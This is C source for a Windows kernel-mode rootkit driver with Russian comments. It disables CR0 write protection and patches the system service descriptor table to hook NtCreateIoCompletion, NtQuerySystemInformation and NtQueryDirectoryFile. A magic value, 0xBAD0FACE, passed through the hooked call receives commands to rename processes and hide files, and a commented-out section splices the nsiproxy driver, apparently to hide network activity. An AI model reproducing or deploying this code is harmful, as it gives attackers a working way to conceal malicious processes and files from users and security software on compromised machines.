#include "inc.h"
#include "rename_proc.h"
#include "command.h"
#include "net.h"
#include "file.h"

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
    PULONG Count;           // массив счётчиков вызовов сервисов
    ULONG Limit;            // количество вызовов в таблице
    PUCHAR Number;          // массив количества параметров вызовов(в байтах)
} KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;


typedef NTSTATUS (*NT_CREATE_IO_COMPLETION)(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

#define NUMBER_NT_CREATE_IO_COMPLETION  0x26 //38
#define SYSCALL_SIGNATURE  0xBAD0FACE

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp);
VOID DriverUnload(IN PDRIVER_OBJECT dob);

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04
);

NT_CREATE_IO_COMPLETION glRealNtCreateIoCompletion;
extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;

ULONG ClearWP(void) {

    ULONG reg = 0;

    __asm {
        mov eax, cr0
        mov[reg], eax
        and eax, 0xFFFEFFFF
        mov cr0, eax
    }

    return reg;
}


void WriteCR0(ULONG reg) {

    __asm {
        mov eax, [reg]
        mov cr0, eax
    }

}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {

    ULONG reg;

#if DBG
    DbgPrint("Load driver %wZ\n", &dob->DriverName);
    DbgPrint("Registry path %wZ\n", rgp);
#endif

    glRealNtCreateIoCompletion = (NT_CREATE_IO_COMPLETION)KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION];
    glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
    glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
    WriteCR0(reg);

    // Init task list for rename process
    ExInitializePagedLookasideList(&glPagedTaskQueueProcess, NULL, NULL, 0, sizeof(TASK_QUEUE_PROCESS), ' LFO', 0);
    InitializeListHead(&glTaskQueueProcess);
    //

    // Init task list for hide file
    ExInitializePagedLookasideList(&glPagedTaskQueueFile, NULL, NULL, 0, sizeof(TASK_QUEUE_FILE), ' LFO', 0);
    InitializeListHead(&glTaskQueueFile);
    //

    // Init splicing hook IRP for net
    //glIrpDirectoryRoutine = glNsiDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
    //if (!NT_SUCCESS(InitHookNet(L"\\Driver\\nsiproxy"))) {
    //    reg = ClearWP();
    //    RtlCopyMemory(glOriginalDirectoryRoutineBytes, glIrpDirectoryRoutine, SPLICING_CODE_SIZE);
    //    *(PBYTE)glIrpDirectoryRoutine = 0xE9;
    //    *(PULONG_PTR)((PBYTE)glIrpDirectoryRoutine + 1) = (ULONG_PTR)HookTcpDeviceControl - ((ULONG_PTR)glIrpDirectoryRoutine + 5);
    //    WriteCR0(reg);
    //}
    //



    dob->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT dob) {

    ULONG reg;

#if DBG
    DbgPrint("Driver unload\n");
#endif

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
    WriteCR0(reg);

    //free list for rename process
    FreeListQueueProcess();
    ExDeletePagedLookasideList(&glPagedTaskQueueProcess);

    //free list for hide file
    FreeListQueueFilename();
    ExDeletePagedLookasideList(&glPagedTaskQueueFile);

    return;
}

ULONG_PTR HookNtCreateIoCompletion(
    ULONG_PTR	arg_01,
    ULONG_PTR	arg_02,
    ULONG_PTR	arg_03,
    ULONG_PTR	arg_04)
{
    PCOMMAND pCmd;
    NTSTATUS retStatus;
    
    if ((ULONG)arg_01 == (ULONG)SYSCALL_SIGNATURE) {
        pCmd = (PCOMMAND)arg_02;
        if (pCmd->flags & COMMAND_TEST_COMMAND) {
            DbgPrint("HookNtCreateIoCompletion execute\n");
        }
        else if (pCmd->flags & COMMAND_RENAME_PROCESS) {
            ULONG len;

            if (pCmd->flags & COMMAND_BUFFER_NUMBER) {

                DbgPrint("RenameProcess PID:%d change:%s\n", (ULONG)pCmd->target, (PCHAR)pCmd->change);
                TaskQueueByPID((ULONG)pCmd->target, (PCHAR)pCmd->change);

            }
            else if (pCmd->flags & COMMAND_BUFFER_POINTER) {

                DbgPrint("RenameProcess name:%s change:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
                TaskQueueByName((PCHAR)pCmd->target, (PCHAR)pCmd->change);

            }
        }
        else if (pCmd->flags & COMMAND_HIDE_FILE) {
            if (pCmd->flags & COMMAND_BUFFER_POINTER) {
                //DbgPrint("Hide file command for %s\n", (PCHAR)pCmd->target);
                TaskQueueByFilename((PCHAR)pCmd->target);
            }

        }
        else {
            DbgPrint("No dispatch for command with flag %d\n", pCmd->flags);
        }
        //PrintTaskQueueProcessList();
        PrintTaskQueueFileList();
    }
    else {
        retStatus = glRealNtCreateIoCompletion(
            arg_01,
            arg_02,
            arg_03,
            arg_04
        );

        //DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
        //    arg_01, arg_02, arg_03, arg_04);
    }

    return retStatus;
}

